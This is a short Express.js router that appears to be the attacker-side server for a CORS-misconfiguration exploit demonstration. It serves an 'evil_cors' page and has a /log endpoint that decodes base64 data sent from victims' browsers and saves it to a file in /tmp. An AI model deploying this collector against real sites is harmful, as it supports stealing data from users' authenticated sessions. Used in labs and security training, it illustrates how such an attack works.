const express = require('express');
const router = express.Router();
const fs = require('fs');

router.get('/', (req, res) => {
    res.render('evil_cors.ejs');
});

router.post('/log', (req, res) => {
    const base64data = req.body.data;
    const decodedData = JSON.parse(Buffer.from(base64data, 'base64').toString('utf-8'));
    console.log(decodedData);
    fs.appendFileSync('/tmp/cors_data.txt', JSON.stringify(decodedData) + '\n');
    res.sendStatus(200);
});

module.exports = router;
